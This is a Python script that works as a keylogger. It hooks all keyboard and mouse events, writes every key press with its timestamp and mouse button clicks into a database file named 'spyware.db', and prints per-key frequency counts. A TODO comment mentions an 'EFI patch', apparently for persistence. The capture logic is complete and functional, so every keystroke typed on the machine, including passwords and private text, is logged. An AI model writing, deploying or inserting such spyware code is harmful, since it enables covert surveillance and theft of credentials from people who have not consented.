import time

import mouse
import keyboard
from typing import Union
import json
from helpers.Database import Database
import threading


def keyboard_callback(key: keyboard.KeyboardEvent):
    global db
    db.insert(table="keys", key=key.name.lower(), down=int(key.event_type == keyboard.KEY_DOWN),
                  time=str(key.time))


def mouse_callback(event: Union[mouse.ButtonEvent, mouse.MoveEvent, mouse.WheelEvent]):
    global db
    if isinstance(event, mouse.ButtonEvent):
        db.insert(table="mouse_buttons", button=event.button, event=event.event_type, time=event.time)
    # elif isinstance(event, mouse.MoveEvent):
    #     db.insert(table="mouse_move", x=event.x, y=event.y, time=event.time)
    # elif isinstance(event, mouse.WheelEvent):
    #     db.insert(table="mouse_wheel", delta=event.delta, time=event.time)


def key_parse():
    global db
    keys = [dict(i) for i in db.execute(f"SELECT * FROM keys WHERE {time.time()} - time <= 60000").fetchall()]
    uniq_keys = []
    keys = sorted(keys, key=lambda x: x["key"])
    for i in keys:
        uniq_keys.append(i["key"])
    uniq_keys = list(set(uniq_keys))
    frequency = {}
    for key in uniq_keys:
        if key not in frequency.keys():
            frequency[key] = 0
        for row in keys:
            if row["key"] == key and row["down"] == 1:
                frequency[key] += 1
    return json.dumps(frequency)


def mouse_button_parse():
    global db
    buttons = [dict(i) for i in db.execute(f"SELECT * FROM mouse_buttons WHERE {time.time()} - time <= 60000").fetchall()]
    uniq_buttons = []
    keys = sorted(buttons, key=lambda x: x["time"])
    for i in keys:
        uniq_buttons.append(i["button"])
    uniq_keys = list(set(uniq_buttons))
    frequency = {}
    for button in uniq_keys:
        if button + "_single" not in frequency.keys():
            frequency[button + "_single"] = 0
            frequency[button + "_double"] = 0
        for row in keys:
            if row["button"] == button and row["event"] == mouse.DOWN:
                frequency[button + "_single"] += 1
            elif row["button"] == button and row["event"] == mouse.DOUBLE:
                frequency[button + "_double"] += 1

    return json.dumps(frequency)


# def mouse_move_parse():
#     global db
#     moves = sorted([dict(i) for i in db.execute(f"SELECT * FROM mouse_move WHERE {time.time()} - time <= 60000").fetchall()], key=lambda x: x["time"])
#     retval = {}
#     for i in range(len(moves)):
#         retval[i] = {"x": moves[i]["x"], "y": moves[i]["y"], "time": moves[i]["time"]}
#     return json.dumps(retval)
#
#
# def mouse_wheel_parse():
#     wheel = sorted([dict(i) for i in db.execute(f"SELECT * FROM mouse_wheel WHERE {time.time()} - time <= 60000").fetchall()], key=lambda x: x["time"])
#     jso = [{str(i): i, "delta": wheel[i]["delta"], "time": wheel[i]["time"]} for i in range(len(wheel))]
#     return json.dumps(jso)


def safe_call(func: callable):
    ret = None
    try:
        lock.acquire(True)
        ret = func()
    finally:
        lock.release()
    return ret


lock = threading.Lock()
CONFIG_FILE = "config.json"
DATABASE_FILE = "spyware.db"  # TODO: make spyware.json EFI patch
with open(CONFIG_FILE, 'r') as config:
    config = json.load(config)
db = Database(DATABASE_FILE)

keyboard.hook(lambda y: safe_call(lambda: keyboard_callback(y)))
mouse.hook(lambda y: safe_call(lambda: mouse_callback(y)))
# time.sleep(10)

print(safe_call(key_parse))
print(safe_call(mouse_button_parse))
# print(safe_call(mouse_wheel_parse))
# print(safe_call(mouse_move_parse))
